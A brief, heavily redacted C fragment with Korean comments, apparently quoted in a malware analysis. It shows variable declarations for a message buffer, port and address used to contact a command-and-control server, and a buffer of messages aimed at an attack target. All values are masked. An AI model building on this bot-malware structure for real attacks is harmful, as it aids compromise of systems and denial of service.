...

{
	...
	char   Buffer[BUFFER_SIZE] = { "**********" }; //C&C 서버로 전송할 메시지

	USHORT   ServerPort = *****; //C&C 서버 포트번호
	...
	CnCServer.sin_addr.s_addr = inet_addr("**********"); //C&C 서버 주소
	...
	char   AttackBuffer[BUFFER_SIZE] = { "*****" }; //공격지 서버로 전송할 메시지
